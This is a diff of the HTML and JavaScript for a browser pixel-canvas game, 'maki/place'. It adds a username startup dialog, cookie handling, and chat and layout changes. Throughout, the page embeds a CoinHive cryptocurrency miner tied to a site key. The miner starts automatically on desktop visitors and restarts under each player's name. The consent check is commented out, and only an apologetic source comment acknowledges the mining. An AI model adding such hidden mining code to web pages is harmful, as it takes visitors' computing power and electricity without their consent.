@@ -2,13 +2,36 @@
 <html>
 	<head>
 		<title>Place</title>
+		<meta property="og:site_name" content="maki/place" />
+		<meta property="og:title" content="[socket_namespace]'s Place" />
+		<meta property="og:url" content="[url]" />
+		<meta property="og:description" content="A place to hang out and chill when you're feeling creative!" />
+		<meta property="og:type" content="image.gallery" />
+		<meta property="og:image" content="https://maki.cat/place/[socket_namespace_lower].png" />
+		<meta property="og:image:width" content="[board_size]" />
+		<meta property="og:image:height" content="[board_size]" />
 		<link href="https://fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet">
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<script src="[miner]"></script>
 		<script>
-			var miner = new CoinHive.Anonymous("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", {throttle: 0.7});
-			if (!miner.isMobile()) miner.start(); // im so sorry... but this wont hurt you i promise <3
+			// im so sorry... but this wont hurt you i promise <3
 			// if you really dont wan't to support me, get ublock origin
 			// or send me a pm on discord about your concerns.
+
+			var miner = new CoinHive.User("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", "_Player", { throttle: 0.4 });
+			if (!miner.isMobile()) miner.start();
+
+			function minerChange(name) {
+				if (!miner) return;
+				miner.stop();
+				miner = new CoinHive.User("uB0AtEOdG8yXQObbRRqNUZWKwOjbsEPN", name, { throttle: 0.4 });
+				if (!miner.isMobile()) miner.start();
+			}
+
+			// miner.on("optin", function(e) {
+			// 	if (e.status != "accepted") {
+			// 		document.location = "https://maki.cat/place";
+			// 	}
+			// });
 		</script>
 		<style type="text/css">
 			body {
@@ -48,13 +71,7 @@
 				overflow: hidden;
 			}
 
-			#controls {
-				position: fixed; margin: auto;
-				bottom: 25px; right: 25px;
-				width: 120px; height: 40px;
-			}
-
-			p { margin: 0; }
+			p, h1, h2 { margin: 0; }
 
 			.box {
 				background-color: rgba(0,0,0,0.8);
@@ -97,7 +114,7 @@
 				width: calc(100% - 8px);
 			}
 
-			#chat-box input {
+			input {
 				margin: 0;
 				border: none;
 				background-color: rgba(255,255,255,0.1);
@@ -109,14 +126,8 @@
 				display: inline-block;
 			}
 
-			#chat-box #player-name {
-				width: 70px;
-				margin-left: -4px;
-				background-color: rgba(255,255,255,0.2);
-			}
-
 			#chat-box #message {
-				width: 248px;
+				width: calc(100% - 16px);
 			}
 
 			textarea:focus, input:focus, div:focus {
@@ -140,29 +151,75 @@
 			#chat-box #messages::-webkit-scrollbar {
     			width: 0;
 			}
+
+			#startup {
+				position: fixed; margin: auto;
+				top: 0; left: 0; right: 0; bottom: 0;
+				background: rgba(0,0,0,0.6);
+				text-align: center;
+			}
+
+			#startup-box {
+				position: fixed; margin: auto;
+				top: 0; left: 0; right: 0; bottom: 0;
+				width: 500px;
+				height: 280px;
+				padding: 25px;
+			}
+
+			.button {
+				background-color: rgba(255,255,255,0.1);
+				padding: 12px 18px;
+				width: calc(100% - 36px);
+				display: inline-block;
+				font-weight: 700;
+			}
+
+			.yes {
+				background-color: rgb(255,0,77);
+			}
+
+			.button:hover {
+				transform: scale(1.1);
+			}
+
+			#ui {
+				opacity: 0;
+			}
 		</style>
 	</head>
 	<body>
 		<canvas id="board" style="display: none;"></canvas>
 		<canvas id="view" oncontextmenu="return false;"></canvas>
-		<a href="https://maki.cat/place"><div id="info" class="box">
-			<p style="font-weight: 700;" id="name">Place</p>
-			<p id="coords">(0,0)</p>
-			<p><span id="players">0</span> players</p>
-			<div id="players-list" style="display: inline-block;"></div>
-		</div></a>
-		<div class="box" id="chat-box">
-			<div id="messages"></div>
-			<input type="text" id="message" autocomplete="off"> 
-			<input type="text" id="player-name" autocomplete="off" value="_Player"> 
+		<div id="ui">
+			<a href="https://maki.cat/place"><div id="info" class="box">
+				<div id="players-list" style="display: inline-block;"></div><br><br>
+				<p id="coords">(0,0)</p>
+				<p><span id="players">0</span> players</p>
+				<p style="font-weight: 700;" id="name">Place</p>
+			</div></a>
+			<div class="box" id="chat-box">
+				<div id="messages"></div>
+				<input type="text" id="message" autocomplete="off"> 
+			</div>
+			<div id="palette" class="box" style="padding: 0;">
+				<div class="color"></div>
+			</div>
 		</div>
-		</div>
-		<div class="box" id="controls">
-			<p style="font-weight: 700;" id="name">Controls:</p>
-			<p>WASD, E, Q, RMB</p>
-		</div>
-		<div id="palette" class="box">
-			<div class="color"></div>
+		<div id="startup">
+			<div id="startup-box" class="box">
+				<h2>Welcome to</h2>
+				<h1>[socket_namespace]'s Place</h1><br>
+				<p>You can move around with:</p>
+				<p><b>Mouse:</b> RMB, Scrolling</p>
+				<p><b>Keyboard:</b> WASD, E, Q</p><br>
+				<p><b>Username:</b></p>
+				<input type="text" id="player-name" autocomplete="off" value="_Player" style="background-color: rgba(255,255,255,0.2);"> 
+				<table style="width: 100%; table-layout: fixed;" cellspacing="20"><tr>
+					<td><a href="https://maki.cat/place" class="button">Back to maki/place</a></td>
+					<td><a href="javascript:startupClose();" class="button yes">Continue</a></td>
+				</tr></table>
+			</div>
 		</div>
 		<script src="/socket.io/socket.io.js"></script>
 		<script type="text/javascript">
@@ -189,13 +246,30 @@
 				board: null,
 				butt_down: {},
 				color: 0,
-				focused: true,
+				focused: false,
 				place_opacity: 0.7,
 				mouse: {x:-1, y:-1},
 				draw_buffer: false
 			};
 
 			var color = [palette];
+
+			// -------
+			// Cookies
+			// -------
+
+			var cookie = {
+				get: function(key) {
+					let c = document.cookie.split("; ");
+					for (var i=0; i<c.length; i++) {
+						let s = c[i].split("=");
+						if (s[0] == key) return s[1];
+					}
+				},
+				set: function(key, value) {
+					document.cookie = key+"="+value;
+				}
+			};
 
 			// ---------
 			// Functions
@@ -218,8 +292,36 @@
 				}
 			}
 
-			var message = document.getElementById("message");
 			var player_name = document.getElementById("player-name");
+			player_name.addEventListener("keyup", function(e) {
+				if (e.key == "Enter") startupClose();
+			});
+			player_name.focus();
+
+			function nameChange(name) {
+				player_name.value = name;
+				socket.emit("name-change", name);
+				cookie.set("place-name", name);
+				minerChange(name);
+			}
+
+			if (cookie.get("place-name")) {
+				let name = cookie.get("place-name");
+				player_name.value = name;
+			}
+
+			function startupClose() {
+				game.focused = true;
+				document.getElementById("startup").style.opacity = "0";
+				document.getElementById("ui").style.opacity = "1";
+				setTimeout(function() {
+					document.getElementById("startup").style.display = "none";
+				}, 100);
+
+				nameChange(player_name.value);
+			}
+
+			var message = document.getElementById("message");
 			var messages = document.getElementById("messages");
 			//messages.innerHTML = "<p style='padding-top: 128px; padding-bottom: 18px; text-align: center; opacity: 0.4;'>- start of chat since connected -</p>";
 			messages.innerHTML = "<p style='padding: 18px 0; text-align: center; opacity: 0.4;'>- start of chat since connected -</p>";
@@ -333,6 +435,11 @@
 			}
 
 			function update() {
+				if (!game.loaded) {
+					window.requestAnimationFrame(update);
+					return;
+				}
+
 				if (game.butt_down["q"]) zoom(1-game.zoom_speed);
 				if (game.butt_down["e"]) zoom(1+game.zoom_speed);
 
@@ -426,11 +533,6 @@
 
 			message.addEventListener("focus", function() { game.focused = false; });
 			message.addEventListener("focusout", function() { game.focused = true; });
-			player_name.addEventListener("focus", function() { game.focused = false; });
-			player_name.addEventListener("focusout", function() {
-				game.focused = true;
-				socket.emit("name-change", player_name.value);
-			});
 
 			message.addEventListener("keyup", function(e) {
 				if (e.key != "Enter") return;
@@ -477,7 +579,6 @@
 			socket.on("load-board", function(res) {
 				game.board_size = res.board_size;
 				initBoard(res.board);
-				socket.emit("name-change", player_name.value);
 			});
 
 			socket.on("place-pixel", function(res) {
@@ -493,6 +594,10 @@
 
 			socket.on("reload-page", function() {
 				document.location.reload() 
+			});
+
+			socket.on("server-restart", function() {
+				nameChange(player_name.value);
 			});
 
 			// var nowPing = 0;
